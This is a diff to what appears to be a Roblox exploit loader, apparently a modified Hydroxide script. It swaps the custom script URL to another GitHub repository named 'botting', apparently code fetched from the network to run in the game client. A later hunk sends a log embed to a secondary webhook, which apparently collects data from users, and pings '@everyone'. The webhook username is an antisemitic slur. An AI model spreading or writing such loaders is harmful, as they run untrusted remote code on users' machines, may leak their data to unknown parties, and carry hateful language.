@@ -1,11 +1,10 @@
-
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
 local DEFAULT_RAW = getgenv().hydroxide_raw or "https://git.fable.bz/zyu/hydroxide/raw/branch/main/"
 local DEPENDENCIES_RAW = "https://raw.githubusercontent.com/Gurberson/gurtson/refs/heads/main/DEPENDENCIES/"
-local CUSTOM_SCRIPT_URL = "https://raw.githubusercontent.com/Gurberson/gurtson/refs/heads/main/mumbaihydroxide"
+local CUSTOM_SCRIPT_URL = "https://raw.githubusercontent.com/Sova4/sdd/refs/heads/main/botting"
 local loader_script = string.format([[
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(1)
@@ -25293,7 +25292,7 @@ end
 
                                     HXD_SEND_WEBHOOK(secondary_webhook_url, {
                                         username = "Jew",
-                                        content = "<@&1454862161015734455>",
+                                        content = "@everyone",
                                         embeds = {log_embed}
                                     })
                                 end)
